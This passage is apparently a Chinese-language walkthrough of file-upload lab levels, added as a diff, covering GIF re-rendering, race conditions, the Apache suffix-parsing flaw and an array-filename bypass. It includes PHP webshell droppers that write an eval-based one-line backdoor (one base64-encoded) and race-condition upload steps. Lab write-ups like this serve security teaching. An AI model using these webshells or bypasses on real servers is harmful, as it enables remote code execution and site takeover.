@@ -996,3 +996,344 @@ if (isset($_POST['submit'])){
     }
 }
 
+源码中使用imagecreatefrom...函数对图片文件进行二次渲染。该函数调用了PHP GD库（GD库，是php处理图形的扩展库），对图片进行了转换。
+
+## 扩展知识
+
+**二次渲染**
+
+二次渲染是图像处理技术，通过服务器端对上传的图像进行重新处理生成新图像，主要用于防范文件上传风险。其核心原理包括接收文件、格式检查、解码、重新编码和保存新图像。
+
+服务器接收上传的图像文件后，通过解码、去除恶意代码再重新编码生成新图片，防止存储或使用带有恶意代码的原始文件。
+
+GIF文件由多个数据块组成，imagecreatefromgif 主要处理图像数据块、全局颜色表等核心块，会忽视一些注释块、应用程序扩展快，被忽视的部分不会被二次渲染，所以可以将webshell藏在未被渲染的部分达到目的
+
+我们可以使用010editor对比源图片文件与渲染过的图片，找到可以插入恶意代码而不会被处理的部分
+
+## 解题方法
+
+首先上传一张安全完整的gif图片，随后保存网页会显的图片，使用010editor打开，在010editor中点击tool→compare→选择原文件与渲染后的图片，点击下方compare栏中的match选项，蓝色的部分就是相同的，未被渲染的部分。
+
+在其中插入一句话木马，保存图片再次上传，接着使用文件包含漏洞即可连接
+
+# pass-17
+
+## 代码分析
+
+$is_upload = false;
+$msg = null;
+
+if(isset($_POST['submit'])){
+    $ext_arr = array('jpg','png','gif');  //白名单
+    $file_name = $_FILES['upload_file']['name'];		//文件上传名字
+    $temp_file = $_FILES['upload_file']['tmp_name'];		//文件上传临时路径
+    $file_ext = substr($file_name,strrpos($file_name,".")+1);		//上传文件后缀
+    $upload_file = UPLOAD_PATH . '/' . $file_name;		//文件上传路径
+      //移动文件上传临时路径到服务器中
+    if(move_uploaded_file($temp_file, $upload_file)){
+        //判断后缀是否在白名单中
+        if(in_array($file_ext,$ext_arr)){
+             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
+             rename($upload_file, $img_path);
+             $is_upload = true;
+        }else{
+            $msg = "只允许上传.jpg|.png|.gif类型文件！";
+            //在服务器中删除已经上传的文件
+            unlink($upload_file);
+        }
+    }else{
+        $msg = '上传出错！';
+    }
+}
+
+观察代码发现，本关会先将代码上传到服务器，随后才进行白名单验证。如果我们高频词、并发性地发送文件上传请求，服务器会在处理多个请求时出现时序混乱，使文件绕过原本的安全校验逻辑，导致恶意文件被成功上传
+
+## 扩展知识
+
+条件竞争（Race Condition）是一种并发编程漏洞，发生在多个线程或进程同时访问共享资源（如变量、文件或内存）时，因缺乏同步机制导致非预期的执行结果，可能被利用于安全攻击或系统故障。
+
+条件竞争的核心是并发执行流对共享资源的无序访问。其产生需满足三个条件：
+
+‌并发性‌：至少两个执行流（如线程或进程）同时运行。‌
+
+‌共享对象‌：多个执行流访问同一资源（如全局变量、文件或数据库记录）。‌
+
+‌状态改变‌：至少一个执行流修改资源状态，否则仅读取不会引发问题。‌
+
+漏洞的根本原因是“竞争窗口”（Race Window）——资源状态未同步的短暂间隙。例如，线程A检查余额后、线程B更新前，线程C可能插入操作，导致数据不一致。‌
+
+## 解题方法
+
+### 方法一
+
+创建包含生成小马语句的文件1.php，它就能在服务器中写入一个木马文件且不会被删除
+
+<?php fputs(fopen('shell.php', 'w'), '<?php @eval($_POST["a"]);?>'); ?>
+
+<?php
+$a='PD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8+';
+$myfile=fopen("shell.php","w");
+ fwrite($myfile,base64_decode($a));
+ fclose($myfile);
+?> 
+
+上传1.txt，抓包发送到intruder模块，同时访问靶场IP/uploads/1.php，同样抓包，发送到intruder模块
+
+设置null payload，无限发送，二者同时开始攻击，等到服务器中成功出现shell.php则说明竞争成功，直接访问shell.php即可
+
+# less-18
+
+## 代码分析
+
+//index.php
+$is_upload = false;
+$msg = null;
+if (isset($_POST['submit']))
+{
+    require_once("./myupload.php");
+    $imgFileName =time();
+    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
+    $status_code = $u->upload(UPLOAD_PATH);
+    switch ($status_code) {
+        case 1:
+            $is_upload = true;
+            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
+            break;
+        case 2:
+            $msg = '文件已经被上传，但没有重命名。';
+            break; 
+        case -1:
+            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
+            break; 
+        case -2:
+            $msg = '上传失败，上传目录不可写。';
+            break; 
+        case -3:
+            $msg = '上传失败，无法上传该类型文件。';
+            break; 
+        case -4:
+            $msg = '上传失败，上传的文件过大。';
+            break; 
+        case -5:
+            $msg = '上传失败，服务器已经存在相同名称文件。';
+            break; 
+        case -6:
+            $msg = '文件无法上传，文件不能复制到目标目录。';
+            break;      
+        default:
+            $msg = '未知错误！';
+            break;
+    }
+}
+
+//myupload.php
+class MyUpload{
+......
+......
+...... 
+  var $cls_arr_ext_accepted = array(
+      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
+      ".html", ".xml", ".tiff", ".jpeg", ".png" );
+
+......
+......
+......  
+  /** upload()
+   **
+   ** Method to upload the file.
+   ** This is the only method to call outside the class.
+   ** @para String name of directory we upload to
+   ** @returns void
+  **/
+  function upload( $dir ){
+    
+    $ret = $this->isUploadedFile();
+    
+    if( $ret != 1 ){
+      return $this->resultUpload( $ret );
+    }
+
+    $ret = $this->setDir( $dir );
+    if( $ret != 1 ){
+      return $this->resultUpload( $ret );
+    }
+
+    $ret = $this->checkExtension();
+    if( $ret != 1 ){
+      return $this->resultUpload( $ret );
+    }
+
+    $ret = $this->checkSize();
+    if( $ret != 1 ){
+      return $this->resultUpload( $ret );    
+    }
+    
+    // if flag to check if the file exists is set to 1
+    
+    if( $this->cls_file_exists == 1 ){
+      
+      $ret = $this->checkFileExists();
+      if( $ret != 1 ){
+        return $this->resultUpload( $ret );    
+      }
+    }
+
+    // if we are here, we are ready to move the file to destination
+
+    $ret = $this->move();
+    if( $ret != 1 ){
+      return $this->resultUpload( $ret );    
+    }
+
+    // check if we need to rename the file
+
+    if( $this->cls_rename_file == 1 ){
+      $ret = $this->renameFile();
+      if( $ret != 1 ){
+        return $this->resultUpload( $ret );    
+      }
+    }
+    
+    // if we are here, everything worked as planned :)
+
+    return $this->resultUpload( "SUCCESS" );
+  
+  }
+......
+......
+...... 
+};
+
+## 扩展知识
+
+**apache解析漏洞**
+
+在apache 1.x，2.x版本中，apache解析文件的规则是从右往左开始解析。如果无法解析后缀名，就会往左判断，直到遇到可解析的版本为止。
+
+例如，上传test.php.7z，apache无法解析.7z，就会向左判断，将此文件解析为php文件。
+
+## 解题方法
+
+上传shell.php.7z文件，php会识别后缀为合法的.7z文件并上传到服务器，但是通过验证后会立即将shell.php部分重命名为时间戳＋随机数，所以php代码仍旧无法生效。
+
+所以本题需要利用apache解析漏洞+条件竞争，上传生成小马的1.php.7z文件，白名单验证会将其当做合法文件上传至服务器，上传后再进行重命名。我们利用条件竞争，在重命名前尝试打开文件，这样apache就会解析这个文件 ，接着由于解析漏洞生成木马文件
+
+完整解题步骤：
+
+创建1.php.7z文件
+
+<?php
+$a='PD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8+';
+$myfile=fopen("shell.php","w");
+ fwrite($myfile,base64_decode($a));
+ fclose($myfile);
+?> 
+
+上传、抓包并发送到攻击模块，并抓包靶机IP/uploads/1.php.7z同样发送到攻击模块。
+
+二者均设置null payload，无限重复攻击，等到服务器中出现shell.php即上传成功
+
+# pass-19
+
+## 代码分析
+
+$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");
+
+        $file_name = $_POST['save_name'];
+        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);
+
+        if(!in_array($file_ext,$deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH . '/' .$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) { 
+                $is_upload = true;
+            }else{
+                $msg = '上传出错！';
+            }
+        }else{
+            $msg = '禁止保存为该类型文件！';
+        }
+
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+
+## 解题方法
+
+本题相当于前面数种方法的集结
+.
+. 
+\.
+默认数据流
+.user.ini
+.php0x00.jpg
+等等方法都可以绕过
+
+# pass-20
+
+## 代码分析
+
+$is_upload = false;
+$msg = null;
+
+if(!empty($_FILES['upload_file'])){
+    //检查MIME
+    //对content-type进行检查
+    //$_FILES['upload_file']：代表用户上传的文件，其中upload_file是表单中文件上传字段的名称。
+    //$_FILES['upload_file']['type']：获取上传文件的 MIME 类型。
+    $allow_type = array('image/jpeg','image/png','image/gif');
+    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
+        $msg = "禁止上传该类型文件!";
+    }else{
+        //检查文件名
+        //判断save_name是否为空，不为空就使用其作为文件名，为空就用文件原来的名字
+        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
+        //判断名字是不是数组，如果不是数组，就用.对名字进行分割。比如1.php,被分割为file[0]=1、file[1]=php
+        if (!is_array($file)) {
+            $file = explode('.', strtolower($file));
+        }
+        //获取file数组的最后一个，也就是php
+        $ext = end($file);
+        $allow_suffix = array('jpg','png','gif');
+        //如果后缀不在白名单之内，就禁止上传；如果在，就允许上传
+        if (!in_array($ext, $allow_suffix)) {
+            $msg = "禁止上传该后缀文件!";
+        }else{
+            //reset()获取数组第一个内容，即1;cout($file)获取数组中非空内容的数量即2,;链接后缀$file[2 - 1]即$file[1]
+            $file_name = reset($file) . '.' . $file[count($file) - 1];
+            //文件暂时路径
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            //保存路径
+            $img_path = UPLOAD_PATH . '/' .$file_name;
+            //移动文件
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $msg = "文件上传成功！";
+                $is_upload = true;
+            } else {
+                $msg = "文件上传失败！";
+            }
+        }
+    }
+}else{
+    $msg = "请选择要上传的文件！";
+}
+
+## 关键函数
+
+1. $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
+2. if (!is_array($file)判断如果名字不是数组就根据.进行分割，那么可以修改save_name使其是一个数组，那么就不会进行分割；
+3.  $ext = end($file);只获取最后一个，因此只要数组最后的内容符合要求就可以上传文件
+4. $file_name = reset($file) . '.' . $file[count($file) - 1];拼接文件名；
+file[0]=1.php,file[1]=88,file[3]=jpg这个数组经过count(file)之后返回3,$file[count($file) - 1]获取的值实际上不是jpg而是$file[3-1]=$file[2]=null，因此$file_name=1.php.+null，而Windows会自动将文件后缀中的空格和特殊字符删除，所以可以成功上传后缀名为php 的一句话木马
+绕过流程
+
+## 解题方法
+
+上传木马文件，抓包修改content-type，将save_name修改为数组
+
+索引[0]为php文件，png文件索引[x]（x>2）
